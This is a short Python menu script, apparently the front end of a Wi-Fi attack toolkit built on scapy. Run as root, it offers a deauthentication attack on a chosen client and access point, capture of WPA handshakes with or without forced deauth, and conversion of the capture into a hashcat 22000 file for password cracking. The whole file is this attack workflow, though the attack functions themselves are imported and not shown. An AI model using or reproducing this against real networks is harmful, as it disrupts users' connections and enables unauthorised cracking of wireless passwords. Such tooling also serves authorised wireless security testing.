
import os, sys
from scapy.all import conf
from def_selIface import selIface
from def_selMac import selMac
from def_atkDeauth import atkDeauth
from def_collEapol import collEapol
from def_convPcap2Hashcat import convPcap2Hashcat


if os.geteuid() != 0:
    sys.exit("Only root can run this script.")

conf.iface = selIface()
print('1. Deauth Attack')
print('2. EAPOL Collect (Normal)')
print('3. EAPOL Collect (Deauth)')
print('4. Convert Pcap to Hashcat File (22000)')
print('')
print('[Your Interface : '+conf.iface+']')
print('')

choice = input('Choose option : ')
print('##########################################################')
if choice == '1':
    vicMac, bssMac = selMac(vicFlag=True, bssFlag=True)
    atkDeauth(vicMac, bssMac)
elif choice == '2':
    collEapol(selMac(bssFlag=True)[1])
elif choice == '3':
    vicMac, bssMac = selMac(vicFlag=True, bssFlag=True)
    collEapol(bssMac, vicAddr=vicMac)
elif choice == '4':
    pcapPath = input('Input file path (*.pcap) : ')
    hcPath = input('Output file (*.hc22000) path : ')
    convPcap2Hashcat(pcapPath, hcPath)

print('exit')